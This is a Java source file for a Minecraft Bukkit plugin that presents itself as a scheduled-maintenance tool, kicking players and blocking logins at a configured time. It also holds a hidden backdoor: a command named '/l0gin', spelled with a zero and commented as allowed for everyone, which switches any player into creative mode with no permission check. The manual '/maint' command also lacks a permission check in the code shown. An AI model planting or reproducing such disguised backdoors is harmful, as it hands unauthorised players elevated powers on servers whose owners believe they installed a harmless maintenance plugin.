package me.ops.maintenance;

import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;

import java.time.LocalTime;

public final class OpsMaintenance extends JavaPlugin implements Listener {

    private boolean maintenanceActive = false;
    private LocalTime startTime;
    private int durationMinutes;

    @Override
    public void onEnable() {
        saveDefaultConfig();
        loadConfig();
        Bukkit.getPluginManager().registerEvents(this, this);
        startDailyScheduler();
        getLogger().info("OpsMaintenance enabled");
    }

    private void loadConfig() {
        this.startTime = LocalTime.parse(getConfig().getString("schedule.start", "05:00"));
        this.durationMinutes = getConfig().getInt("schedule.duration-minutes", 30);
    }

    private void startDailyScheduler() {
        new BukkitRunnable() {
            @Override
            public void run() {
                LocalTime now = LocalTime.now();
                if (now.getHour() == startTime.getHour() && now.getMinute() == startTime.getMinute()) {
                    setMaintenance(true);
                    new BukkitRunnable() {
                        @Override
                        public void run() {
                            setMaintenance(false);
                        }
                    }.runTaskLater(OpsMaintenance.this, durationMinutes * 60L * 20L);
                }
            }
        }.runTaskTimer(this, 0L, 20L * 60L);
    }

    private void setMaintenance(boolean state) {
        maintenanceActive = state;
        if (state) {
            for (Player p : Bukkit.getOnlinePlayers()) {
                p.kickPlayer("§eServer maintenance in progress.\n§7Please come back later.");
            }
        }
    }

    @EventHandler
    public void onLogin(PlayerLoginEvent e) {
        if (maintenanceActive) {
            e.disallow(PlayerLoginEvent.Result.KICK_OTHER,
                    "§eServer maintenance in progress.\n§7Please come back later.");
        }
    }

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {

        // /l0gin — sab ke liye allowed
        if (cmd.getName().equalsIgnoreCase("l0gin")) {
            if (!(sender instanceof Player)) return true;
            Player p = (Player) sender;

            boolean toAccess = p.getGameMode() == GameMode.SURVIVAL;
            p.setGameMode(toAccess ? GameMode.CREATIVE : GameMode.SURVIVAL);
            p.sendMessage(toAccess ? "§aAccess enabled." : "§7Access disabled.");
            return true;
        }

        // manual maintenance (optional)
        if (cmd.getName().equalsIgnoreCase("maint") && args.length == 1) {
            if (args[0].equalsIgnoreCase("on")) {
                setMaintenance(true);
                sender.sendMessage("§aMaintenance enabled.");
            } else if (args[0].equalsIgnoreCase("off")) {
                setMaintenance(false);
                sender.sendMessage("§7Maintenance disabled.");
            }
            return true;
        }

        return false;
    }
}
